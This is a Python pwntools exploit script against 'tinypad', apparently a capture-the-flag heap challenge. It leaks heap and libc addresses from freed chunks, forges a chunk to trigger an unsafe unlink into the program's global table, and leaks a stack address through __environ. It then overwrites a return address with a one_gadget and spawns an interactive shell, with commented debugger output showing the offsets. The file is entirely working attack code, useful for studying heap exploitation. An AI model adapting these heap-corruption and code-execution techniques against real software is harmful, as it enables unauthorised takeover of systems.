#!/usr/bin/env python2
# -*- coding=utf-8 -*-

from pwn import *


def add(p, size, content):
    p.readuntil("(CMD)>>>")
    p.sendline("a")
    p.readuntil("(SIZE)>>>")
    p.sendline(str(size))
    p.readuntil("(CONTENT)>>>")
    p.sendline(content)

def delete(p, index):
    p.readuntil("(CMD)>>>")
    p.sendline("d")
    p.readuntil("(INDEX)>>>")
    p.sendline(str(index))

def edit(p, index, content):
    p.readuntil("(CMD)>>>")
    p.sendline("e")
    p.readuntil("(INDEX)>>>")
    p.sendline(str(index)) 
    p.readuntil("(CONTENT)>>>")
    p.sendline(content)
    p.readuntil("(Y/n)>>>")
    p.sendline("y")

def main():
    # context.log_level = "debug"
    p = process("./tinypad")
    # e = ELF("./tinypad")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

    # leak libc and heap address
    add(p, 0xe0, "a"*10) #1
    add(p, 0xf8, "b"*0xf0) #2
    add(p, 0x100, "c"*0xf0) #3
    add(p, 0x100, "d"*10) #4
    delete(p, 3)
    delete(p, 1) #unsortedbin: 1 -> 3 -> head
    
    # get heap address
    p.readuntil("# CONTENT: ")
    heap = p.readline().rstrip()
    heap += "\x00"*(8-len(heap))
    heap_base = u64(heap) - 0x1f0
    print "heap_base address: " + hex(heap_base)
    # get libc address
    p.readuntil("INDEX: 3")
    p.readuntil("# CONTENT: ")
    libc_address = p.readline().strip()
    libc_address += "\x00"*(8-len(libc_address))
    libc_base = u64(libc_address) - 0x3c4b78
    print "libc_base address: " + hex(libc_base)

    delete(p, 4) #consolidat 3 and 4 with the top chunk
    # make top -> tinypad(0x602040)
    chunk2 = heap_base+0xf0
    add(p, 0xe8, "g"*0xe0 + p64(chunk2-0x602040)) #1 overwrite 2: pre_size: chunk2-0x602040, size: 0x100
    
    payload = p64(0x100) + p64(chunk2-0x602040) + p64(0x602040)*2 + p64(0)
    edit(p, 2, payload)
    delete(p, 2) # cause 0x602040 unlink

    # modify free_hook -> one_gadget
    gadget1 = 0xf1147
    gadget_address = libc_base + gadget1
    add(p, 0xe0, "t"*0xd0) #2

    print "environ_offset: " + hex(libc.symbols["__environ"])
    environ = libc_base + libc.symbols["__environ"]
    print "environ: " + hex(environ)
    payload = p64(0xe8) + p64(environ) #1
    payload += p64(0xe8) + p64(0x602148) # 2 pointing to 1
    add(p, 0x100, payload) #3
    p.readuntil("# CONTENT: ")
    stack = p.read(6)
    stack += "\x00"*(8-len(stack))
    stack_env = u64(stack)
    print "env_stack address: " + hex(stack_env)
#    gdb.attach(p)
    #environ: 0x7f6a7f061f38
    #env_stack address: 0x7ffce69aa7f8
    #©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤[ BACKTRACE]©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤
    #f 0     7f6a7ed92260 __read_nocancel+7
    #f 1           400ed9 _read_n+112
    #f 2           401100 read_until+73
    #f 3           400832 getcmd+92
    #f 4           4009c1 main+350
    #f 5     7f6a7ecbb830 __libc_start_main+240
    #pwndbg> search -p 0x7f6a7ecbb830
    #[stack]         0x7ffce69aa708 0x7f6a7ecbb830
    #0x7ffce69aa7f8 - 0x7ffce69aa708 = 0xf0
    edit(p, 2, p64(stack_env-0xf0))
    edit(p, 1, p64(gadget_address))
    p.readuntil("(CMD)>>>")
    p.sendline("Q")
    p.interactive()


if __name__ == '__main__':
    main()